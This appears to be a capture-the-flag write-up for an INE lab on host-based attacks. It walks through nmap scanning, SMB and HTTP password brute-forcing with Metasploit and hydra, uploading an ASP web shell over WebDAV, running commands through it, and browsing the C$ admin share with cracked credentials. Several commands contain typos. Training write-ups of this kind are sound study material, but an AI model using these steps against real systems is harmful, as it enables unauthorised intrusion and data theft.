# INE System/Host-Based Attacks CTF 1
**Targets:** `target1.ine.local`, `target2.ine.local`
**Tools:** `nmap`, `hydra`, `dirb`, `cadaver`, Metasploit (`smb_login`, `smb_enumshares`)
---
##STEP 0 :scan target1
‘’’
Nmap -sV -sC target1.ine.local.com -O -oX scan_results
‘’’
<img width="940" height="725" alt="image" src="https://github.com/user-attachments/assets/4b3c549d-7b43-4adf-af9b-5f5235e90064" />

**Why:** The usual first step.. confirming what’s running before picking an attacking path.
**Results:** IIS 10.0 on port 80 returned ‘401 unauthorised’ with ‘Basic realm=target1.ine.local’, meaning the website itself requires a login over HTTP Basic Auth. SMB(139/445) and RDP(3389) were also open. The hint about ‘bob’s password marches this login prompt directly.
---
##FLAG1 : Weak password for IIS/SMB user bob
##Brute-forcing bob’s password
‘’’
Service postgresql start && Msfconsole -q
Search smb_login
Set smbuser bob
run
‘’’
<img width="940" height="168" alt="image" src="https://github.com/user-attachments/assets/03d3f86d-1d02-4142-8bf1-33d93ec89bfe" />

**Why:** Windows accounts are typically shared between SMB and IIS Basic Auth when they’re both backed by the same local user database, so brute-forcing bob’s SMB password was likely to also unlock the website.
**Result:** ‘bob:password_123321’ succeeded.
‘’’
dirb http://target1.ine.local -u bob:password_123321
‘’’
<img width="940" height="726" alt="image" src="https://github.com/user-attachments/assets/2e006d38-12af-440f-a6f3-e6f8d1233eb4" />

**Why:** ‘dirb’ with ‘-u’ supplies the credentials on every request, letting it brute-force paths behind the login prompt rather than just hitting the 401 page repeatedly. A ‘/webdav/’ directory came as listable.  WebDAV is an HTTP extension that lets files be uploaded, moved and edited directly over HTTP, which is exactly why `cadaver` (a WebDAV client) was in the provided tool list.
‘’’
http://target1.ine.locla/webdav/
‘’’
<img width="940" height="358" alt="image" src="https://github.com/user-attachments/assets/ee807922-c49f-4fb0-84a9-f777b57f8145" />

**Result:** the directory listing included ‘flag1.txt’ directly, along with ‘test.asp’. Confirming ASP script placed  here will actually execute, which matters for flag 2.
---
##FLAG 2 : Web shell via Webdav upload
‘’’
cadaver http://target1.ine.local/webdav
‘’’
‘’’
Username: bob
Password : password_123321
dav :/webdav/> put /usr/share/wenshells/asp/webshell.asp
‘’’
<img width="940" height="291" alt="image" src="https://github.com/user-attachments/assets/57946a1d-085b-42f4-9649-47bb24d9239e" />

**Why:** since ‘/webdav/’ allows both file uploads (confirmed by bob's WebDAV authentication succeeding) and ASP script execution (confirmed by `test.asp` existing there).it’s a direct path to remote code execution: upload an ASP web shell and browse to it.
**How it works:** ‘cadaver’ is a command-line Webdav client. It speaks the WebDav ‘PUT’ method to upload files to a server the same way a browser’s “Save As” would, just without needing GUI.
‘’’
http://target1.ine.local/webdav/webshell.asp?cmd=type+C%3A\flag2.txt
‘’’
<img width="940" height="516" alt="image" src="https://github.com/user-attachments/assets/c4d6a125-02aa-4cc5-8c60-9e0ddf148cc1" />

**Result:** The page confirmed the server details and returned  the flag text appended directly after the server’s local IP address in the response.
---
##FLAG 3: Guessing SMB credentials on target2.
###What I did
‘’’
hydra -L /usr/share/metasploit-framework/data/wordlists/common_user.txt -P /usr/share/ metasploit-framework/data/wordlists/unix_passwords.txt target2.ine.local smb
‘’’
<img width="940" height="324" alt="image" src="https://github.com/user-attachments/assets/d4bb0940-b9b3-47bb-8d8b-41df40b6d441" />

**Result:** four pairs came back — `rooty:spongebob`, `demo:password1`, `auditor:hellokitty`, and critically, **`administrator:pineapple`**.
‘’’
search smb_enushares
set smbuser administrator 
set smbpass pineapple
run
‘’’ 
<img width="940" height="738" alt="image" src="https://github.com/user-attachments/assets/ac43639e-5c1f-4c04-aa9c-80abdda2b861" />

**Why:** having found administrator-level credentials, enumerating shares with them shows the full set available, including `C$` — the administrative share that maps directly to the entire `C:\` drive, matching Flag 2's earlier hint about valuable files living there.
‘’’
 smbclient  \\\target2.ine.local\\C$ -U administrator
‘’’
‘’’
smb: \> ls
smb : \> more flag3.txt
‘’’
<img width="940" height="525" alt="image" src="https://github.com/user-attachments/assets/c0bf867b-acee-4075-9c00-ee3442d0f0b8" />

##flag 4 : Enumerating the Desktop directory 
###What I did
Having full ‘C$’ as administrator, I navigated to the usual per-user Desktop path:
‘’’
smb: \> cd Users\administrator\Desktop
smb: \> ls
smb: more flag4.txt
‘’’
<img width="940" height="213" alt="image" src="https://github.com/user-attachments/assets/a794d776-d4e4-4fcd-a29c-6191ca49b919" />

	
**Why:** the Desktop folder is one of the first places worth checking once you have full filesystem access — it's a common (if careless) place to leave sensitive files, and the hint pointed directly at it.
---
